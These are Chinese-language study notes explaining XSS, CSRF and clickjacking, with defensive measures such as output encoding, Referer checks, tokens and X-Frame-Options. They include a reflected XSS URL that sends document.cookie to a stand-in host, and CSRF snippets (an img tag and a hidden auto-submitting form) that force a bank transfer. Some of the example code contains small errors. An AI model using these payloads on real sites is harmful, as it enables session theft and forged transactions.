三种攻击：https://segmentfault.com/a/1190000011601837
************************************************************************************************************************************
1. xss (cross site scripting)

   1.Reflected XSS
   2.Stored XSS
   3.DOM-based or local XSS

   Reflected XSS: http://you.163.com/search?keyword=<script>document.location='http://xss.com/get?cookie='+document.cookie</script>
   Sotred XSS: 和reflected xss 区别就是 把具有攻击性的脚本保存到了 服务器并且可以被普通用户完整的从服务器取得并执行，
               1. 发一个文章，里面包含恶意脚本  ：开始放假了收到尽快发就<script> alter('xss')<script>
               2. 后端没有过滤，直接保存到了数据库。
               3. 当其他读者看到这篇文章时，恶意脚本就会执行。

    DOM-based or local XSS: DOM型的XSS其实是一种特殊类型的反射性XSS,它是基于DOM文档对象模型的一种漏洞。可以通过DOM来动态修改页面内容。
               可触发DOM型的XSS的属性：
                    document.referer  window.name location innerHTML document.write....

    对于一切用户的输入，输出，客户端的输入内容，不可信。 在数据添加到dom或者执行dom api 时，我们需要对内容进行htmlencode 或者JavaScriptEncode

************************************************************************************************************************************
2. csrf (cross-site request forgery) 跨站请求伪造，也被称为“one click attack” 或者 Session Riding
   与xss 不同： xss 是利用站点内的信任用户，csrf则通过伪装来自受信任用户的请求来利用受信任的网站。


   存在漏洞的webA，攻击者：webB， 受害者： user（C）/webA
   攻击步骤：

   1. User（c） 浏览并登陆信任网站A
   2. 通过验证，User（c） 处产生A的cookie
   3. user（C）在没有登出webA的情况下，访问微信网站webB
   4. B要求访问第三方webA，发出一个请求（request）
   5. 根据B在4的请求，浏览器带着2产生的cookie访问A


   example: 
   1. 网站B： <img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
      登录网站B的时候，这段代码执行，向A发送了GET请求（带着cookie）， 网站A的错误是使用GET请求更新资源。
   2. 银行决定用post请求完成操作。
     A： <form action="Transfer.php" method="POST">
		    <p>ToBankId: <input type="text" name="toBankId" /></p>
		    <p>Money: <input type="text" name="money" /></p>
		    <p><input type="submit" value="Transfer" /></p>
		</form>


		<?php
		　　　　session_start();
		　　　　if (isset($_REQUEST['toBankId'] &&　isset($_REQUEST['money']))
		　　　　{
		　　　　    buy_stocks($_REQUEST['toBankId'],　$_REQUEST['money']);
		　　　　}
		?>
    
     B： <img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>

     还是可以攻击，因为A后台使用了 $_REQUEST, $_REQUEST 既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是
     POST请求的数据。在PHP中，可以使用$_GET 和 $_POST 分别获取get请求和post请求的数据。 在java中同样存在这个问题。

   3. 银行决定把请求数据的方式也改了。
      <?php
	　　　　session_start();
	　　　　if (isset($_POST['toBankId'] &&　isset($_POST['money']))
	　　　　{
	　　　　    buy_stocks($_POST['toBankId'],　$_POST['money']);
	　　　　}
	　　?>

	  但是呢，网站B：

	     <html>
		　　<head>
		　　　　<script type="text/javascript">
		　　　　　　function steal()
		　　　　　　{
		          　　　　 iframe = document.frames["steal"];
		　　     　　      iframe.document.Submit("transfer");
		　　　　　　}
		　　　　</script>
		　　</head>

		　　<body onload="steal()">
		　　　　<iframe name="steal" display="none">
		　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
		　　　　　　　　<input type="hidden" name="toBankId" value="11">
		　　　　　　　　<input type="hidden" name="money" value="1000">
		　　　　　　</form>
		　　　　</iframe>
		　　</body>
		</html>
     还是攻击成功，因为这里危险网站B暗地里发送了post请求到银行。

 csrf主要攻击方式是1和2. 攻击源于web的隐式身份验证机制。web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证请求是该用户批准发送的。


 防御策略：

 1. HTTP Referer 字段。

    优点： 简单，只需要在给所有安全敏感的请求同意增加个拦截器来检查referer的值就可以
    缺点： referer的值是由浏览器提供的，不可全信。 用户可以自己设置浏览器使其发送时不在提供referer时，网站将拒绝合法用户的访问。

2. 请求地址中加入token
    优点： 比referer 安全，并且不涉及用户隐私。
    缺点： 对所有请求都添加token比较困难，难以保证token本身的安全
3. 在http投中自定义属性并验证+one-Time Tokens
    优点： 统一管理token输入输出，可以保证token的安全性
    缺点： 有局限性，无法在非异步请求上实施。
************************************************************************************************************************************************
3. 点击劫持（clickjacking）
   
   就是攻击者会利用一个或多个透明或不透明的层来诱骗用户点击按钮操作。

   防御策略：

   x-frame-options

   http header，只是浏览器不允许从其他域进行取景， 转么用来防御利用iframe嵌套的点击劫持攻击。  
   三个值：  deny sameorigin  allow-from








